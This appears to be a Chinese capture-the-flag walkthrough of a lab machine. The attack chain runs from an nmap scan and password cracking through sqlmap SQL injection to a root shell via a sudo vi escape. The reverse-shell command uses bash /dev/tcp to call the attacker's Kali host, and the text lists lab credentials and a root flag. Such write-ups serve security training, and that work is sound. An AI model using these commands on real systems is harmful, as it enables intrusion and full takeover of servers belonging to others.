> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/OhaEhzZ37GqeMdtgNaosEA)

![](https://mmbiz.qpic.cn/mmbiz_jpg/eR1JusQTlickMsTDGx8RibkaToLmkC4CWzn9MAa3LYeArFFI0cQCNu84zyXWLEOHypFGGV71B40sa9HygSH8icIicw/640?wx_fmt=jpeg)

0x01 端口扫描
=========

![](https://mmbiz.qpic.cn/mmbiz_png/eR1JusQTlickgfbiaibgelBzOJ0q5OUkFzLnoKTvbrYOth1a5Mo2vPicaVn2jvYeBg6aHky87W2tqMcjNqYN8I3W3A/640?wx_fmt=png)

使用

```
nmap -sV -sS 10.10.10.46
```

执行端口扫描，并且显示版本信息和端口服务  

![](https://mmbiz.qpic.cn/mmbiz_png/eR1JusQTlickgfbiaibgelBzOJ0q5OUkFzL87W8ljDcJ9bZQC3L5qrYPfTpXssiaZ1evvE1fWvTVfJKBsagrbJ1iaOA/640?wx_fmt=png)

发现目标主机开放了 21 端口 FTP 服务、22 端口 SSH 服务、80 端口 web 服务。  

我们可以优先通过 FTP 服务登录，然后可以对 web 服务提供渗透线索，因为登录的凭据是上一个靶场 Oopsie 获取到的，用于下一个靶场的使用（疏忽忘记写了）：在 / root/.config/filezilla 路径下的 filezilla.xml 配置文件，用户登录凭据是：ftpuser/mc@F1l3ZilL4

![](https://mmbiz.qpic.cn/mmbiz_png/eR1JusQTlickgfbiaibgelBzOJ0q5OUkFzLexDEwdvxHuVP0SVZ4GBHTuvLibd7x4IUMwqM9rJrH9UDgM9sFs2SzVg/640?wx_fmt=png)

我们使用 ls 查看当前目录下的文件，发现存在 backup.zip 这个类似备份的 zip 文件，我们 get 下来，解压后发现需要解压密码  

![](https://mmbiz.qpic.cn/mmbiz_png/eR1JusQTlickgfbiaibgelBzOJ0q5OUkFzL2uTDX6zMNOAn7RkCbMASP5xUlTSqSiaEC8kN1jyIv916gsm4HaaibKsg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/eR1JusQTlickgfbiaibgelBzOJ0q5OUkFzLbP3UDK4icyRXexibSAlwzphmlmzyXdtdmlS6gQY7CasKvHtbYtu3vc2g/640?wx_fmt=png)

可以使用 kali 的 john，也可以在 win 下使用 archpr 去爆破压缩包密码。  

![](https://mmbiz.qpic.cn/mmbiz_png/eR1JusQTlickgfbiaibgelBzOJ0q5OUkFzLWhxeIDGbDslZymyeiaEIxibRib83wDYZXb6kKaMRZAD7Oezk92zDXCeqw/640?wx_fmt=png)

爆破出压缩包解压密码为 741852963，然后输入压缩包密码解压，发现有两个文件：index.php 和 style.css 文件，打开 index.php  

![](https://mmbiz.qpic.cn/mmbiz_png/eR1JusQTlickgfbiaibgelBzOJ0q5OUkFzLk1iaxGUk00GXQ0gpU3rZlP9I1KyzJ5I3jCxrqPEZU2icV6PHlLnavuBQ/640?wx_fmt=png)

通过代码审计可以知道，里面有一个 web 登录的凭证，用户名 admin，密码 2cb42f8734ea607eefed3b70af13bbd3 是经过 MD5 算法进行加密，这时候可以使用在线的解密网站 somd5 解密，明文密码是：qwerty789

![](https://mmbiz.qpic.cn/mmbiz_png/eR1JusQTlickgfbiaibgelBzOJ0q5OUkFzLeFtnGQ9iav31lX0U7ic3ZAmqPkww6wz5D7M6fzZ6lh73FhM5bY9TUBNA/640?wx_fmt=png)

  

===

0x02 WEB 渗透  

==============

浏览器访问 10.10.10.46

![](https://mmbiz.qpic.cn/mmbiz_png/eR1JusQTlickgfbiaibgelBzOJ0q5OUkFzLODCiczmbUicHWzicaoq6iaSiaCaM8znDPicD5gaMMSlC8jNib0alFj5eJczibw/640?wx_fmt=png)

使用账号：admin, 密码 qwerty789 登录后台，发现有个搜索框  

![](https://mmbiz.qpic.cn/mmbiz_png/eR1JusQTlickgfbiaibgelBzOJ0q5OUkFzLSvNiciaicJMgBibicO11jgric5SEic7XlcibPyvLhj0D8yyia3XRmONRNZgpOrA/640?wx_fmt=png)

我们随便输入一个 1, 搜索  

![](https://mmbiz.qpic.cn/mmbiz_png/eR1JusQTlickgfbiaibgelBzOJ0q5OUkFzL52KPuFiaTA5S4j2USgCZiaCelReGsx1GkhQcOnAyNYSvt3gWRtSrz07g/640?wx_fmt=png)

然后发现 url 是 search=1，很快想到可以测试是否存在 SQL 注入漏洞  

![](https://mmbiz.qpic.cn/mmbiz_png/eR1JusQTlickgfbiaibgelBzOJ0q5OUkFzLaVQY80Dp4PyYr0KpL7FBKuOaPV5gPnNdMNcIyoSibKoUS7jPow5ZmMQ/640?wx_fmt=png)

使用’ or 1=1 #有返回报错，可以试试使用 sqlmap 去注入。  

在搜索框随便写内容，然后点击搜索时候使用 burp 抓包，右键保存文件为 sql.txt

![](https://mmbiz.qpic.cn/mmbiz_png/eR1JusQTlickgfbiaibgelBzOJ0q5OUkFzLzgXHTaGz2uKz5VqI4W1LY2jHPBFcd8U1e7TVrLh0fOGOkPY1b3C7jg/640?wx_fmt=png)

然后使用 sql.txt 去跑 sqlmap  

![](https://mmbiz.qpic.cn/mmbiz_png/eR1JusQTlickgfbiaibgelBzOJ0q5OUkFzLawXIQYy52M8uiakOxcibpN3yN5W2FciapmkKlJUrQw6m04R1pYt77RgoA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/eR1JusQTlickgfbiaibgelBzOJ0q5OUkFzLjwrqNB7fqxTBUYfMZVoKsnsJHX9yibIibiaa3KVhj3Ou5RymbEAXQaHXg/640?wx_fmt=png)

发现确实存在 SQL 注入漏洞，且数据库为 postgresql 数据库，我们继续使用 - os—shell 获取到 shell  

![](https://mmbiz.qpic.cn/mmbiz_png/eR1JusQTlickgfbiaibgelBzOJ0q5OUkFzLHw1Fjxh6SFUyhzhAG2ZvZ8LHKOL2eY2Iznet050kxc1ib3LUNcdjzyw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/eR1JusQTlickgfbiaibgelBzOJ0q5OUkFzLIUnL7CeOa0OXqFUevjN7Nk0Un4vEz6Bc2IVa1icygiaFcuqngwdXLYzg/640?wx_fmt=png)

发现 shell 获取成功，使用 whoami 查看当前用户名  

![](https://mmbiz.qpic.cn/mmbiz_png/eR1JusQTlickgfbiaibgelBzOJ0q5OUkFzL6Gf5DvAbRh5JoRD328KmPpoZWmlU4r3iaCBht8lribGjNhvVicdLcQuEg/640?wx_fmt=png)

当前用户名是 postgres，然后我们使用 bash -c 反弹 shell 到 kali  

输入：

```
bash -c 'bash -i >& /dev/tcp/10.10.16.9/1234 0>&1'
```

其中 10.10.16.9 是自己的 kali 的 IP，1234 是反弹的端口（随意写）。然后监听 1234 端口

![](https://mmbiz.qpic.cn/mmbiz_png/eR1JusQTlickgfbiaibgelBzOJ0q5OUkFzLxSEJV5ab7yJp0gu0ttj1C1cqBqQZeH7FVkn2dgdoNsS8CxrAt7AUMw/640?wx_fmt=png)

然后成功反弹 shell，切换到当前用户根目录，ls 查看，本身应该有个 user.txt 的。感觉靶场有问题，所以不予理会。  

![](https://mmbiz.qpic.cn/mmbiz_png/eR1JusQTlickgfbiaibgelBzOJ0q5OUkFzLgY8vsx0JBeThv9CczYbCBp1PHmcFAcdCUg6wcJHyKvicJVUshB0B0BQ/640?wx_fmt=png)

  

===

0x03 提升权限  

============

![](https://mmbiz.qpic.cn/mmbiz_png/eR1JusQTlickgfbiaibgelBzOJ0q5OUkFzLUNLf3W6sJ5VNffqUB4PibHNP81bvB3odTYXvX16oLSUjZxaaxNJIytQ/640?wx_fmt=png)

在 var/www/html / 路径下，发现有个 dashboard.php 文件，cat 一下试试  

![](https://mmbiz.qpic.cn/mmbiz_png/eR1JusQTlickgfbiaibgelBzOJ0q5OUkFzLK2gaQG1tl85zy3Plcjt4IlU8via9RkK2wxLVHyj1chEKNJFv3Gst6Cw/640?wx_fmt=png)

通过代码审计可知有个数据库连接配置，显示用户名是 postgres，密码是 P@s5w0rd!  

我们现在需要把 shell 升级为 TTY， tty 命令用于显示终端机连接标准输入设备的文件名称

```
SHELL=/bin/bash script -q /dev/null
```

![](https://mmbiz.qpic.cn/mmbiz_png/eR1JusQTlickgfbiaibgelBzOJ0q5OUkFzL6iadEGslJFQmn6KD5AEH8XqNGrpoDgFAza62HFUIia2zqXDWjVngWjOw/640?wx_fmt=png)

使用 sudo -l 查看自己当前的权限  

![](https://mmbiz.qpic.cn/mmbiz_png/eR1JusQTlickgfbiaibgelBzOJ0q5OUkFzLxRmFXIkoDvmreSoUDPIPic38kufpUvc3s4lrvyicjBBLql0M2jI97lYw/640?wx_fmt=png)

发现最下面有个用户可以使用 VI 编辑 / etc/postgresql/11/main/pg_hba.conf 配置文件，利用它来获得一个根 shell 并访问 root.txt。  

```
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

![](https://mmbiz.qpic.cn/mmbiz_png/eR1JusQTlickgfbiaibgelBzOJ0q5OUkFzLQ7IwPHWxk0eFoGMicKmVdHicvXAV1fibF8SVyWCa0ZCicUicrSnTT6QwsQg/640?wx_fmt=png)

进入 vi 之后打字会重叠，所以直接输入:!/bin/bash 就可以了  

![](https://mmbiz.qpic.cn/mmbiz_png/eR1JusQTlickgfbiaibgelBzOJ0q5OUkFzLDfL11ws98nRqBqJdgxZJBKiaWuC1EGTl5yIVQpaEg8cDKWmw8ytL3MA/640?wx_fmt=png)

进入 / root 目录下，查看 root.txt 可以获得 root 的 flag：  

dd6e058e814260bc70e9bbdef2715849

![](https://mmbiz.qpic.cn/mmbiz_png/eR1JusQTlickgfbiaibgelBzOJ0q5OUkFzLv8xtoiaxBH93bEtZicM7NCOxzOib2hWbspa6kdicJIIzibfORb3I2tW9Jmw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/FIBZec7ucCjv9me2lz9aUeUY91fHaIhIbkc2J43Tickxbaiaqe2MANKPWZfK8FfVCu5BJpgR7Pofgs7DCYkL6c6g/640?wx_fmt=png)

  

  

END

  

  

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC7IHABFmuMlWQkSSzOMicicfBLfsdIjkOnDvssu6Znx4TTPsH8yZZNZ17hSbD95ww43fs5OFEppRTWg/640?wx_fmt=gif)

●[轻轻的来 - iptables 详解](http://mp.weixin.qq.com/s?__biz=MzkwNzE5ODAwOQ==&mid=2247484685&idx=1&sn=5b12c7365ac2c12cca2177bfa02cecfe&chksm=c0ddae5bf7aa274d85dff048ea639d0f27ba838f7364a41089d8bdfea3cec9ad8c6d4d00d84a&scene=21#wechat_redirect)

●[反序列化命令执行漏洞](http://mp.weixin.qq.com/s?__biz=MzkwNzE5ODAwOQ==&mid=2247484673&idx=1&sn=d515a96b358bff8a67b525e458a9c3db&chksm=c0ddae57f7aa274157ee1006c6110506ac83029b523958e7bcd9197325dfa1f39d2dd4a39c48&scene=21#wechat_redirect)

●[内核提权 CVE-2021-3493 漏洞复现](http://mp.weixin.qq.com/s?__biz=MzkwNzE5ODAwOQ==&mid=2247484656&idx=1&sn=5ffc6ccde46b5d5a904e49cea17f2897&chksm=c0ddafa6f7aa26b001f61322b499752d239645895add94a719a4c2c11edc6d2ae876e8a8d814&scene=21#wechat_redirect)

●[一款内网自动化横向工具：InScan 开源扫描器](http://mp.weixin.qq.com/s?__biz=MzkwNzE5ODAwOQ==&mid=2247484545&idx=1&sn=f181bae594be7ac09dd6b50c173094cd&chksm=c0ddafd7f7aa26c1f6de6b2303d1f3be1c2989aa99c0aef9c97cb16d87827295bc15fef54915&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_jpg/eR1JusQTlickMsTDGx8RibkaToLmkC4CWz8zNkHLeL7JtdiaXP0mar0MRibpGCB7SO4CibSV0HIosb1YU0lfK6khDbg/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_png/eR1JusQTlickMsTDGx8RibkaToLmkC4CWzQSKWgFGMnMHsYOL5D02RBZlSW7dScaicHTUn7c4fuM6OjT3DMicwQqCQ/640?wx_fmt=png)

微信搜一搜

![](https://mmbiz.qpic.cn/mmbiz_png/eR1JusQTlickMsTDGx8RibkaToLmkC4CWzZCg3tG3oeEoqRppB2aTTItcvZeb91phQIOgkgconYP531tNhjzxGuQ/640?wx_fmt=png)

悬剑武器库